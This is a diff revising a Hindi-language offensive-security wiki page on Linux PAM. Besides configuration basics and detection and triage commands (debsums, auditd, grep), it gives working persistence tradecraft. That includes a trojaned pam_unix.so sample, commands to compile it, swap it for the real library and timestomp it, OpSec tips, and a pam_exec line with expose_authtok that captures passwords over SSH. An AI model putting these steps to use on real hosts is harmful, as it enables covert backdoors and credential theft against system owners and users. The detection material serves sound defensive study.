@@ -4,14 +4,14 @@
 
 ### मूल जानकारी
 
-**PAM (Pluggable Authentication Modules)** एक सुरक्षा तंत्र के रूप में काम करता है, जो **कंप्यूटर सेवाओं तक पहुँचने का प्रयास कर रहे उपयोगकर्ताओं की पहचान सत्यापित करता है** और विभिन्न मानदंडों के आधार पर उनकी पहुँच नियंत्रित करता है। यह एक डिजिटल द्वारपाल की तरह है, जो सुनिश्चित करता है कि केवल अधिकृत उपयोगकर्ता ही विशिष्ट सेवाओं का उपयोग कर सकें और सिस्टम पर अत्यधिक भार से बचने के लिए उनके उपयोग को सीमित भी कर सकता है।
+**PAM (Pluggable Authentication Modules)** एक सुरक्षा तंत्र के रूप में काम करता है, जो **कंप्यूटर सेवाओं तक पहुँचने का प्रयास करने वाले उपयोगकर्ताओं की पहचान सत्यापित करता है** और विभिन्न मानदंडों के आधार पर उनकी पहुँच नियंत्रित करता है। यह एक डिजिटल द्वारपाल की तरह है, जो सुनिश्चित करता है कि केवल अधिकृत उपयोगकर्ता ही विशिष्ट सेवाओं का उपयोग कर सकें और सिस्टम पर अधिक भार पड़ने से रोकने के लिए उनके उपयोग को सीमित भी कर सकता है।
 
 #### कॉन्फ़िगरेशन फ़ाइलें
 
-- **Solaris** पुरानी केंद्रीय फ़ाइल `/etc/pam.conf` का समर्थन करता है, लेकिन मौजूदा मार्गदर्शन `/etc/pam.d` के अंतर्गत सेवा फ़ाइलों को प्राथमिकता देता है।<sup>[[10]](#references)</sup>
-- **Linux systems** डायरेक्टरी-आधारित तरीका पसंद करते हैं और सेवा-विशिष्ट कॉन्फ़िगरेशन `/etc/pam.d` में रखते हैं। उदाहरण के लिए, login सेवा की कॉन्फ़िगरेशन फ़ाइल `/etc/pam.d/login` में मिलती है।<sup>[[1]](#references)</sup>
+- **Solaris** पुरानी केंद्रीय फ़ाइल `/etc/pam.conf` का समर्थन करता है, लेकिन मौजूदा मार्गदर्शन में `/etc/pam.d` के अंतर्गत service फ़ाइलों को प्राथमिकता दी जाती है।<sup>[[10]](#references)</sup>
+- **Linux systems** में directory-आधारित तरीका पसंद किया जाता है, जिसमें service-विशिष्ट कॉन्फ़िगरेशन `/etc/pam.d` के अंतर्गत रखे जाते हैं। उदाहरण के लिए, login service की कॉन्फ़िगरेशन फ़ाइल `/etc/pam.d/login` में मिलती है।<sup>[[1]](#references)</sup>
 
-login सेवा के लिए PAM कॉन्फ़िगरेशन का उदाहरण कुछ इस तरह दिख सकता है:
+login service के लिए PAM कॉन्फ़िगरेशन का एक उदाहरण कुछ ऐसा दिख सकता है:
 
 ```
 auth required /lib/security/pam_securetty.so
@@ -28,53 +28,53 @@ session required /lib/security/pam_unix_session.so
 
 #### **PAM Management Realms**
 
-ये realms या management groups, **auth**, **account**, **password**, और **session** को शामिल करते हैं। इनमें से हर group authentication और session management प्रक्रिया के अलग-अलग पहलुओं के लिए ज़िम्मेदार होता है:<sup>[[1]](#references)</sup>
+ये realms, या management groups, **auth**, **account**, **password**, और **session** शामिल करते हैं। इनमें से हर एक authentication और session management प्रक्रिया के अलग-अलग पहलुओं के लिए ज़िम्मेदार है:<sup>[[1]](#references)</sup>
 
-- **Auth**: उपयोगकर्ता की पहचान की पुष्टि करता है, अक्सर पासवर्ड पूछकर।
-- **Account**: account की पुष्टि करता है और group membership या दिन के समय से जुड़ी पाबंदियों जैसी शर्तें जाँचता है।
-- **Password**: पासवर्ड अपडेट संभालता है, जिसमें complexity जाँच या dictionary attacks से बचाव शामिल है।
-- **Session**: service session शुरू या समाप्त होने पर होने वाली कार्रवाइयाँ संभालता है, जैसे directories mount करना या resource limits सेट करना।
+- **Auth**: उपयोगकर्ता की पहचान सत्यापित करता है, अक्सर password पूछकर।
+- **Account**: account का सत्यापन करता है और group membership या समय-आधारित प्रतिबंधों जैसी शर्तों की जाँच करता है।
+- **Password**: password अपडेट प्रबंधित करता है, जिसमें complexity जाँच या dictionary attacks की रोकथाम शामिल है।
+- **Session**: service session शुरू या समाप्त होने के दौरान की कार्रवाइयाँ प्रबंधित करता है, जैसे directories mount करना या resource limits सेट करना।
 
 #### **PAM Module Controls**
 
-Controls तय करते हैं कि module success या failure पर कैसी प्रतिक्रिया देगा और इससे पूरी authentication प्रक्रिया प्रभावित होती है। इनमें शामिल हैं:<sup>[[1]](#references)</sup>
+ये controls सफलता या विफलता पर module की प्रतिक्रिया तय करते हैं और समग्र authentication प्रक्रिया को प्रभावित करते हैं। इनमें शामिल हैं:<sup>[[1]](#references)</sup>
 
-- **Required**: किसी required module की विफलता अंततः प्रक्रिया को विफल कर देती है, लेकिन उससे पहले बाद के सभी modules जाँचे जाते हैं।
+- **Required**: किसी required module की विफलता अंततः प्रक्रिया को विफल कर देती है, लेकिन उसके बाद के सभी modules की जाँच होने के बाद ही।
 - **Requisite**: विफलता होने पर प्रक्रिया तुरंत समाप्त हो जाती है।
-- **Sufficient**: यदि पहले का कोई `required` module विफल न हुआ हो, तो success मिलते ही प्रक्रिया लौट आती है और उसी management group के बाकी modules छोड़ देती है।
-- **Optional**: यह केवल तभी विफलता का कारण बनता है जब stack में यही अकेला module हो।
+- **Sufficient**: अगर पहले का कोई `required` module विफल नहीं हुआ है, तो सफलता तुरंत लौटती है और उसी management group के बाकी modules छोड़ दिए जाते हैं।
+- **Optional**: विफलता केवल तभी होती है जब stack में यही एक module हो।
 
-#### Offensive Semantics That Matter
+#### महत्वपूर्ण Offensive Semantics
 
 PAM का विश्लेषण या संशोधन करते समय, **जोड़े गए rule की जगह** तय करती है कि कौन-सा stack उसे देखेगा:<sup>[[1]](#references)[[13]](#references)</sup>
 
-- `include` और `substack` दूसरे files से rules लाते हैं। इसलिए `sshd` में बदलाव का असर केवल SSH पर हो सकता है, जबकि `system-auth`, `common-auth` या किसी अन्य shared stack में बदलाव एक साथ कई services को प्रभावित कर सकता है।<sup>[[1]](#references)[[13]](#references)</sup>
-- PAM bracketed controls जैसे `[success=1 default=ignore]` भी support करता है। इनका दुरुपयोग करके सफल custom check के बाद एक या अधिक modules **छोड़े** जा सकते हैं, बजाय इसके कि `pam_unix.so` को साफ़ तौर पर बदला जाए।<sup>[[1]](#references)</sup>
-- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) या default PAM module directory के **relative** हो सकता है। आधुनिक Linux systems में वास्तविक directories अक्सर `/lib/security`, `/lib64/security`, `/usr/lib/security`, या `/usr/lib/x86_64-linux-gnu/security` जैसे multiarch paths होते हैं।<sup>[[1]](#references)[[14]](#references)</sup>
+- `include` और `substack` अन्य files से rules लाते हैं। इसलिए `sshd` को संपादित करने से केवल SSH प्रभावित हो सकता है, जबकि `system-auth`, `common-auth`, या किसी अन्य साझा stack को संपादित करने से एक साथ कई services प्रभावित हो सकती हैं।<sup>[[1]](#references)[[13]](#references)</sup>
+- PAM `[success=1 default=ignore]` जैसे bracketed controls का भी समर्थन करता है। इनका दुरुपयोग करके, सफल custom check के बाद **एक या अधिक modules छोड़े** जा सकते हैं, बजाय इसके कि `pam_unix.so` को स्पष्ट रूप से बदला जाए।<sup>[[1]](#references)</sup>
+- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) हो सकता है या default PAM module directory के **relative** हो सकता है। आधुनिक Linux systems में वास्तविक directories अक्सर `/lib/security`, `/lib64/security`, `/usr/lib/security`, या `/usr/lib/x86_64-linux-gnu/security` जैसे multiarch paths होते हैं।<sup>[[1]](#references)[[14]](#references)</sup>
 
-Operators के लिए संक्षिप्त सलाह: बदलाव करने से पहले हमेशा **पूरे service graph** का पता लगाएँ। उदाहरण के लिए, कुछ distros में `sshd -> password-auth -> system-auth` या अन्य में `sshd -> system-remote-login -> system-login -> system-auth` का मतलब है कि वही एक-पंक्ति का implant, इरादे से कहीं अधिक services तक फैल सकता है।<sup>[[1]](#references)[[13]](#references)</sup>
+Operators के लिए त्वरित सीख: patch करने से पहले हमेशा **पूरा service graph** मैप करें। उदाहरण के लिए, कुछ distros में `sshd -> password-auth -> system-auth` और अन्य में `sshd -> system-remote-login -> system-login -> system-auth` का अर्थ है कि वही एक-पंक्ति implant, इरादे से कहीं अधिक सेवाओं तक पहुँच सकता है।<sup>[[1]](#references)[[13]](#references)</sup>
 
-एक custom `auth` module, account password के बाद `sudo` में interactive challenge जोड़ सकता है। Challenge को स्वयं जाँचने से पहले प्रभावी `/etc/pam.d/sudo` stack, शामिल policy, module arguments, और संदर्भित किसी भी local data file की permissions का निरीक्षण करें। केवल पढ़ी जा सकने वाली challenge word list से password check bypass नहीं होता और न ही sudoers grant मिलता है। Privileged transition के लिए अब भी सही account authentication, हर required PAM step का पूरा होना, और root-capable sudo rule ज़रूरी है; unattended enumeration से challenge शुरू नहीं होना चाहिए।
+एक custom `auth` module, account password के बाद `sudo` में interactive challenge जोड़ सकता है। Challenge की मैन्युअल समीक्षा करने से पहले प्रभावी `/etc/pam.d/sudo` stack, शामिल policy, module arguments, और संदर्भित किसी भी local data file की permissions की जाँच करें। केवल पढ़ी जा सकने वाली challenge word list से password check bypass नहीं होता और न ही sudoers grant मिलता है। Privileged transition के लिए सही account authentication, हर required PAM step को पूरा करना, और root-capable sudo rule होना अभी भी ज़रूरी है; unattended enumeration से challenge शुरू नहीं होना चाहिए।
 
-पुराने Ubuntu [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) के लिए, वास्तविक `libpam-modules` build और यह जाँचें कि कोई login service प्रभावित session module को invoke करती है या नहीं। Ubuntu ने 9.10 के लिए **1.1.0-2ubuntu1.1** और 10.04 LTS के लिए **1.1.1-2ubuntu5** में इसे ठीक किया था; अन्य releases या vendor backports के लिए अलग package assessment ज़रूरी है। रिपोर्ट किए गए मामले में caller को अपने home `.cache` को symlink से बदलना पड़ता था और फिर PAM login trigger करना होता था, जिससे पुराना module किसी protected target का ownership बदल देता था। केवल `.cache` entry, `pam_motd.so` line या पुराना kernel version exposure साबित नहीं करता। Passive enumeration के दौरान files बदले या login शुरू किए बिना home-directory control, प्रभावी module version, login reachability, symlink handling और target permissions जाँचें। [Ubuntu का security notice](https://ubuntu.com/security/notices/USN-959-1) देखें।
+Legacy Ubuntu [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) के लिए, वास्तविक `libpam-modules` build की जाँच करें और पता लगाएँ कि कोई login service प्रभावित session module चलाती है या नहीं। Ubuntu ने 9.10 के लिए **1.1.0-2ubuntu1.1** और 10.04 LTS के लिए **1.1.1-2ubuntu5** में इसे ठीक किया था; अन्य releases या vendor backports के package का अलग से आकलन करना होगा। रिपोर्ट किए गए तरीके में caller को अपने home `.cache` को symlink से बदलना और फिर PAM login शुरू करना पड़ता था, जिससे पुराने module ने एक protected target का ownership बदल दिया। केवल `.cache` entry, `pam_motd.so` line, या पुराने kernel version से exposure साबित नहीं होता। Passive enumeration के दौरान files बदले या login शुरू किए बिना home-directory पर नियंत्रण, प्रभावी module version, login तक पहुँच, symlink handling, और target permissions जाँचें। [Ubuntu का security notice](https://ubuntu.com/security/notices/USN-959-1) देखें।
 
-#### उदाहरण परिदृश्य
+#### Example Scenario
 
-कई auth modules वाले setup में प्रक्रिया एक तय क्रम का पालन करती है। यदि `pam_securetty` module को login terminal अनधिकृत लगता है, तो root logins रोक दिए जाते हैं; फिर भी इसके "required" status के कारण सभी modules process किए जाते हैं। `pam_env` environment variables सेट करता है, जिससे user experience बेहतर हो सकता है। `pam_ldap` और `pam_unix` modules मिलकर उपयोगकर्ता को authenticate करते हैं। `pam_unix` पहले दिए गए password का उपयोग करने की कोशिश करता है, जिससे authentication के तरीकों में efficiency और flexibility बढ़ती है।<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+कई auth modules वाले setup में प्रक्रिया एक सख्त क्रम का पालन करती है। अगर `pam_securetty` module को login terminal अनधिकृत लगता है, तो root logins रोक दिए जाते हैं, फिर भी उसकी "required" स्थिति के कारण सभी modules प्रोसेस किए जाते हैं। `pam_env` environment variables सेट करता है, जिससे user experience बेहतर हो सकता है। `pam_ldap` और `pam_unix` modules मिलकर उपयोगकर्ता को authenticate करते हैं; `pam_unix` पहले से दिए गए password का उपयोग करने की कोशिश करता है, जिससे authentication methods अधिक कुशल और लचीले बनते हैं।<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
 
 ## किसी service stack में `pam_permit`
 
-`pam_permit.so` PAM checks के लिए success लौटाता है। यदि कम privileged user किसी service की प्रभावी PAM policy बदल सकता है, तो इसे ऐसे control flag के साथ जोड़ने से, जो authentication stack को बीच में ही रोक देता है, उस service के लिए password check हट सकता है। `sudo` के लिए, कौन-सी services प्रभावित होंगी यह तय करने से पहले `/etc/pam.d/sudo` और शामिल की गई किसी भी `common-auth` या `system-auth` file का निरीक्षण करें। PAM authentication bypass से **नई sudoers rule नहीं मिलती**; उपयोगकर्ता को अब भी अनुरोधित command चलाने की अनुमति होनी चाहिए। यह मानने के बजाय कि `sufficient pam_permit.so` की एक line हमेशा सफल होगी, rules के क्रम और पहले हुई किसी भी `required` विफलता की जाँच करें।
+`pam_permit.so` PAM checks में success लौटाता है। अगर कम विशेषाधिकार वाला उपयोगकर्ता किसी service की प्रभावी PAM policy को बदल सकता है, तो इसे ऐसे control flag के साथ जोड़कर जो authentication stack को बीच में ही रोक दे, उस service का password check हटाया जा सकता है। `sudo` के लिए, यह तय करने से पहले कि कौन-सी services प्रभावित हैं, `/etc/pam.d/sudo` और शामिल किसी भी `common-auth` या `system-auth` file की जाँच करें। PAM authentication bypass से नया sudoers rule **नहीं** मिलता; उपयोगकर्ता को अनुरोधित command चलाने की अनुमति फिर भी होनी चाहिए। यह मानने के बजाय कि `sufficient pam_permit.so` की एक line हमेशा सफल होगी, rules के क्रम और पहले हुई किसी भी `required` विफलता की जाँच करें।
 
-## Backdooring PAM – Hooking `pam_unix.so`
+## PAM में Backdoor डालना – `pam_unix.so` को Hook करना
 
-अहम Linux environments में persistence की एक पुरानी तरकीब है **वैध PAM library को trojanised drop-in से बदलना**। ऐसे host पर जिसका PAM stack `pam_unix.so` load करता है, SSH या console authentication इसके `pam_sm_authenticate()` entry point को invoke कर सकता है; एक malicious replacement credentials capture कर सकता है या *magic* password bypass लागू कर सकता है।<sup>[[2]](#references)[[11]](#references)</sup>
+उच्च-मूल्य वाले Linux environments में persistence की एक पारंपरिक तरकीब है **वैध PAM library को trojanised drop-in से बदलना**। जिस host का PAM stack `pam_unix.so` लोड करता है, वहाँ SSH या console authentication उसके `pam_sm_authenticate()` entry point को चला सकता है; दुर्भावनापूर्ण replacement credentials हासिल कर सकता है या *magic* password bypass लागू कर सकता है।<sup>[[2]](#references)[[11]](#references)</sup>
 
-### Compilation Cheat Sheet
-नीचे दिया गया उदाहरण Linux-PAM के `pam_sm_authenticate()` service entry point और authentication token तक पहुँचने के लिए `pam_get_authtok()` का उपयोग करता है।<sup>[[11]](#references)[[12]](#references)</sup>
+### Compilation Cheatsheet
+नीचे दिया गया उदाहरण authentication token तक पहुँचने के लिए Linux-PAM के `pam_sm_authenticate()` service entry point और `pam_get_authtok()` का उपयोग करता है।<sup>[[11]](#references)[[12]](#references)</sup>
 <details>
-<summary>उदाहरण `pam_unix.so` trojan</summary>
+<summary>Sample `pam_unix.so` trojan</summary>
 
 ```c
 #define _GNU_SOURCE
@@ -128,7 +128,9 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const cha
 }
 ```
 
-कंपाइल करें और stealth-replace करें (replacement/timestomp pattern को Unit 42 ने documented किया है)। Wrapper में hard-coded backup path और नीचे दिए गए commands, दोनों को target की वास्तविक PAM module directory के अनुसार समायोजित करें:<sup>[[2]](#references)</sup>
+</details>
+
+Compile करें और stealth-replace करें (replacement/timestomp pattern को Unit 42 ने दस्तावेज़ित किया है)। Wrapper में hard-coded backup path और नीचे दिए गए commands—दोनों को target की वास्तविक PAM module directory के अनुसार समायोजित करें:<sup>[[2]](#references)</sup>
 ```bash
 gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
 mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
@@ -138,19 +140,19 @@ touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
 ```
 
 ### OpSec सुझाव
-1. **Atomic overwrite** – पूरी library को एक temporary file में लिखें और फिर उसे उसकी जगह rename करें, ताकि authentication module अधूरा लिखा हुआ न रह जाए।
-2. Unit 42 के AuthDoor analysis में `/usr/bin/.dbus.log` जैसा path देखा गया था, इसलिए यह hunting के लिए एक उपयोगी indicator भी है।<sup>[[2]](#references)</sup>
-3. PAM stack द्वारा अपेक्षित entry points (उदाहरण के लिए, `pam_sm_authenticate` और `pam_sm_setcred`) बनाए रखें, ताकि अन्य management operations काम करते रहें।<sup>[[11]](#references)[[18]](#references)</sup>
+1. **Atomic overwrite** – एक पूरी library को temporary file में लिखें और उसे सही जगह पर rename करें, ताकि authentication module आंशिक रूप से लिखा हुआ न रह जाए।
+2. Unit 42 के AuthDoor विश्लेषण में `/usr/bin/.dbus.log` जैसा path देखा गया था, इसलिए यह hunting के लिए एक उपयोगी indicator भी है।<sup>[[2]](#references)</sup>
+3. PAM stack द्वारा अपेक्षित entry points (उदाहरण के लिए, `pam_sm_authenticate` और `pam_sm_setcred`) को बनाए रखें, ताकि अन्य management operations काम करते रहें।<sup>[[11]](#references)[[18]](#references)</sup>
 
 ### Detection
-Package-integrity checks के लिए, RPM installed-file metadata verify करता है, `debsums -s` checksum errors बताता है, और triage block में `dpkg -S` package ownership की जाँच करता है; audit watch syntax किसी path पर writes और attribute changes रिकॉर्ड करता है।<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+Package-integrity checks के लिए, RPM installed-file metadata को verify करता है, `debsums -s` checksum errors की रिपोर्ट करता है, और triage block में `dpkg -S` package ownership की जाँच करता है; audit watch syntax किसी path पर writes और attribute changes को रिकॉर्ड करता है।<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 * `pam_unix.so` के MD5/SHA256 की तुलना distro package से करें।
-* बदली हुई libraries का पता लगाने के लिए, manual hashing के बिना `rpm -V pam` या `debsums -s libpam-modules` चलाएँ।
-* `/lib/security/` के अंतर्गत world-writable files या असामान्य ownership की जाँच करें।
+* Manual hashing के बिना बदली हुई libraries ढूँढ़ने के लिए `rpm -V pam` या `debsums -s libpam-modules` चलाएँ।
+* `/lib/security/` के अंतर्गत world-writable permissions या असामान्य ownership की जाँच करें।
 * `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`।
-* अप्रत्याशित modules के लिए PAM configs में grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`।
+* अनपेक्षित modules के लिए PAM configs में grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`।
 
-यह `pam_` grep उन custom modules को नहीं पकड़ता जिनके `.so` basenames अलग हैं। `/etc/pam.d` में **active** `auth`, `account`, `password`, और `session` lines की समीक्षा करें (और जहाँ उपयोग हो, वहाँ `/etc/pam.conf` की भी), साथ ही उनके control flag और किसी भी included stack की जाँच करें। सामान्य password check से पहले `auth sufficient` के रूप में रखा गया कोई अपरिचित module, package ownership और binary की समीक्षा का कारण है; [PAM का control syntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) success मिलने पर stack के उस हिस्से को जल्दी समाप्त कर सकता है। केवल module name, असामान्य timestamp, या `nodelay` option से bypass साबित नहीं होता। यदि behavior से timing leak का संकेत मिले, तो पहले implementation और service reachability की जाँच करें; routine enumeration के दौरान बार-बार authentication guesses submit न करें।
+यह `pam_` grep ऐसे custom modules को नहीं पकड़ता जिनके अन्य `.so` basenames हों। `/etc/pam.d` में (और जहाँ इस्तेमाल हो, वहाँ `/etc/pam.conf` में) मौजूद **active** `auth`, `account`, `password`, और `session` lines की समीक्षा करें; इसमें उनका control flag और कोई भी included stack शामिल करें। सामान्य password check से पहले `auth sufficient` के रूप में रखा गया अपरिचित module package ownership और binary review के योग्य है; [PAM का control syntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) stack के उस हिस्से को सफलता मिलने पर जल्दी समाप्त कर सकता है। केवल module name, असामान्य timestamp, या `nodelay` option से bypass साबित नहीं होता। यदि व्यवहार timing leak का संकेत देता है, तो पहले implementation और service reachability की जाँच करें; routine enumeration के दौरान बार-बार authentication guesses सबमिट न करें।
 
 ### Quick triage commands (compromise के बाद या threat hunting के लिए)
 ```bash
@@ -169,27 +171,27 @@ done
 grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
 ```
 
-### persistence के लिए `pam_exec` का दुरुपयोग
-`pam_unix.so` को बदलने के बजाय, `/etc/pam.d/sshd` में `pam_exec` लाइन जोड़ना एक कम दखल देने वाला तरीका है। इससे PAM की उस लाइन तक पहुँचने वाला invocation सामान्य stack को बरकरार रखते हुए एक helper चलाता है।<sup>[[4]](#references)</sup>
+### Persistence के लिए `pam_exec` का दुरुपयोग
+`pam_unix.so` को बदलने के बजाय, एक कम दखल देने वाला तरीका है `/etc/pam.d/sshd` में `pam_exec` लाइन जोड़ना, ताकि उस PAM लाइन तक पहुँचने वाला invocation एक helper चलाए और सामान्य stack जस का तस रहे।<sup>[[4]](#references)</sup>
 ```bash
 # Run during the auth phase; expose_authtok sends the token on stdin
 auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
 ```
-`pam_exec` को `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` और `PAM_TYPE` जैसे environment variables में PAM metadata मिलता है। `expose_authtok` के साथ, helper `auth` या `password` phases के दौरान `stdin` से password के अधिकतम `PAM_MAX_RESP_SIZE` bytes पढ़ सकता है। यदि आप चाहते हैं कि helper real UID के बजाय effective UID के साथ चले, तो `seteuid` जोड़ें।<sup>[[4]](#references)</sup>
+`pam_exec` PAM metadata को `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, और `PAM_TYPE` जैसे environment variables में प्राप्त करता है। `expose_authtok` के साथ, helper `auth` या `password` phases के दौरान `stdin` से पासवर्ड के अधिकतम `PAM_MAX_RESP_SIZE` bytes पढ़ सकता है। यदि आप चाहते हैं कि helper real UID के बजाय effective UID के साथ चले, तो `seteuid` जोड़ें।<sup>[[4]](#references)</sup>
 
-व्यावहारिक टिप्पणियाँ, `pam_exec` के लिए documented module types और `type=` filter के अनुसार हैं:<sup>[[4]](#references)</sup>
+व्यावहारिक नोट्स, `pam_exec` के लिए दस्तावेज़ीकृत module types और `type=` filter के अनुसार हैं:<sup>[[4]](#references)</sup>
 
-- **login के बाद की कार्रवाइयों** जैसे sockets को फिर से खोलने या detached daemon को spawn करने के लिए `session optional pam_exec.so ...` बेहतर है।
-- **credentials capture** के लिए `auth optional pam_exec.so quiet expose_authtok ...` आम तौर पर चुना जाता है, क्योंकि यह session खुलने से पहले चलता है।
-- किसी विशिष्ट PAM phase तक execution सीमित करने और अनावश्यक दोहरे execution से बचने के लिए `type=session` या `type=auth` का उपयोग किया जा सकता है।
+- `session optional pam_exec.so ...` **post-login actions** के लिए बेहतर है, जैसे sockets को फिर से खोलना या detached daemon शुरू करना।
+- `auth optional pam_exec.so quiet expose_authtok ...` **credential capture** के लिए आम विकल्प है, क्योंकि यह session खुलने से पहले चलता है।
+- किसी खास PAM phase तक execution सीमित करने और अनावश्यक दोहरे execution से बचने के लिए `type=session` या `type=auth` का उपयोग किया जा सकता है।
 
-Privilege review के लिए, ऐसा absolute `pam_exec.so` helper path जिसे current user लिख सकता हो, एक संभावित जोखिम है, भले ही file पर append-only (`a`) चिह्न लगा हो: [यह attribute append करने की अनुमति देता है](https://man7.org/linux/man-pages/man1/chattr.1.html), जो shell script के बाद के व्यवहार को बदलने के लिए पर्याप्त हो सकता है। पहले पुष्टि करें कि PAM service और event वास्तव में उस line तक पहुँचते हैं, helper और उसका parent path भरोसेमंद हैं, और command अधिक privileged identity के तहत चलती है; [`seteuid` बदलता है कि कौन-सा PAM UID उपयोग होता है](https://man7.org/linux/man-pages/man8/pam_exec.8.html)। केवल writable file या `lsattr` का परिणाम privileged execution साबित नहीं करता।
+Privilege review के लिए, ऐसा absolute `pam_exec.so` helper path जिसे मौजूदा user लिख सकता है, एक संभावित समस्या है—भले ही file पर append-only (`a`) flag लगा हो: [यह attribute appending की अनुमति देता है](https://man7.org/linux/man-pages/man1/chattr.1.html), जो shell script के बाद के व्यवहार को बदलने के लिए पर्याप्त हो सकता है। पहले पुष्टि करें कि PAM service और event वास्तव में उस line तक पहुँचते हैं, helper और उसका parent path विश्वसनीय हैं, और command अधिक privileged identity के तहत चलती है; [`seteuid` तय करता है कि कौन-सा PAM UID इस्तेमाल होगा](https://man7.org/linux/man-pages/man8/pam_exec.8.html)। केवल writable file या `lsattr` का परिणाम privileged execution साबित नहीं करता।
 
-### Distro tooling के बावजूद टिके रहना: `authselect`
+### Distro tooling के बाद भी बने रहना: `authselect`
 
-RHEL और Fedora-family systems पर, जहाँ `authselect` का उपयोग होता है, `/etc/pam.d/system-auth` या `/etc/pam.d/password-auth` जैसी generated files में सीधे किए गए बदलाव **`authselect` द्वारा overwrite किए जा सकते हैं**। बदलाव बनाए रखने के लिए, operators अक्सर `/etc/authselect/custom/<profile>/` के अंतर्गत active custom profile में बदलाव करते हैं और फिर उसे दोबारा select करते हैं।<sup>[[5]](#references)[[19]](#references)</sup>
+`authselect` का उपयोग करने वाले RHEL और Fedora-family systems में, `/etc/pam.d/system-auth` या `/etc/pam.d/password-auth` जैसी generated files में सीधे किए गए बदलाव **`authselect` द्वारा overwrite किए जा सकते हैं**। Persistence के लिए, operators अक्सर `/etc/authselect/custom/<profile>/` के अंतर्गत सक्रिय custom profile में बदलाव करते हैं और फिर उसे दोबारा चुनते हैं।<sup>[[5]](#references)[[19]](#references)</sup>
 
-जब आपके पास root हो, तो सामान्य workflow यह है:<sup>[[5]](#references)</sup>
+Root access होने पर आम workflow:<sup>[[5]](#references)</sup>
 
 ```bash
 # Inspect the active profile first
@@ -202,32 +204,32 @@ find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 
 authselect apply-changes
 ```
 
-यह offense और triage, दोनों के लिए महत्वपूर्ण है: अगर `/etc/pam.d/system-auth` में `Generated by authselect` और `Do not modify this file manually` बैनर मौजूद हैं, तो persistence का असली स्थान `/etc/pam.d/` के बजाय `/etc/authselect/custom/` में हो सकता है।<sup>[[5]](#references)</sup>
+यह offense और triage, दोनों के लिए महत्वपूर्ण है: अगर `/etc/pam.d/system-auth` में `Generated by authselect` और `Do not modify this file manually` बैनर मौजूद हैं, तो persistence का वास्तविक बिंदु `/etc/pam.d/` के बजाय `/etc/authselect/custom/` में हो सकता है।<sup>[[5]](#references)</sup>
 
-### हाल में वास्तविक दुनिया में दिखी tradecraft
+### हाल में वास्तविक घटनाओं में देखी गई tradecraft
 
-Plague Linux backdoor पर 2025 की हालिया रिपोर्टिंग में यही मूल विचार और आगे बढ़ा हुआ दिखा: एक malicious PAM component जिसमें **static bypass password** था, साथ ही लॉगिन के बाद session traces कम करने के लिए SSH-संबंधित environment variables और shell history (`HISTFILE=/dev/null`) को साफ़ किया जाता था।<sup>[[3]](#references)</sup> यह hunting के लिए उपयोगी pattern है, क्योंकि backdoor logic PAM में हो सकता है, जबकि stealth artifacts केवल authentication सफल होने **के बाद** दिखाई देते हैं।
+Plague Linux backdoor पर 2025 की हालिया रिपोर्टिंग में यही मूल विचार और आगे बढ़ाया गया: एक malicious PAM component जिसमें **static bypass password** था, साथ ही login के बाद session traces कम करने के लिए SSH-संबंधित environment variables और shell history (`HISTFILE=/dev/null`) को साफ़ किया गया।<sup>[[3]](#references)</sup> यह hunting के लिए एक उपयोगी pattern है, क्योंकि backdoor का logic PAM में हो सकता है, जबकि stealth artifacts केवल authentication सफल होने के **बाद** दिखाई देते हैं।
 
 
 ## References
 
 - [1] [pam.conf(5) / pam.d(5) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man5/pam.d.5.html)
-- [2] [गुप्त ऑपरेटर की कार्यपुस्तिका: वैश्विक टेलीकॉम नेटवर्क में घुसपैठ - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
+- [2] [गुप्त ऑपरेटर की कार्य-पुस्तिका: वैश्विक दूरसंचार नेटवर्क में घुसपैठ - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
 - [3] [Nextron Systems - Plague: Linux के लिए नया खोजा गया PAM-आधारित backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
 - [4] [pam_exec(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
 - [5] [authselect का उपयोग करके user authentication कॉन्फ़िगर करना - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
 - [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
-- [7] [debsums(1) - Debian मैनपेज](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
+- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
 - [8] [auditctl(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/auditctl.8.html)
-- [9] [dpkg-query(1) - Debian मैनपेज](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
-- [10] [Oracle Solaris 11.4 में authentication प्रबंधित करना](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
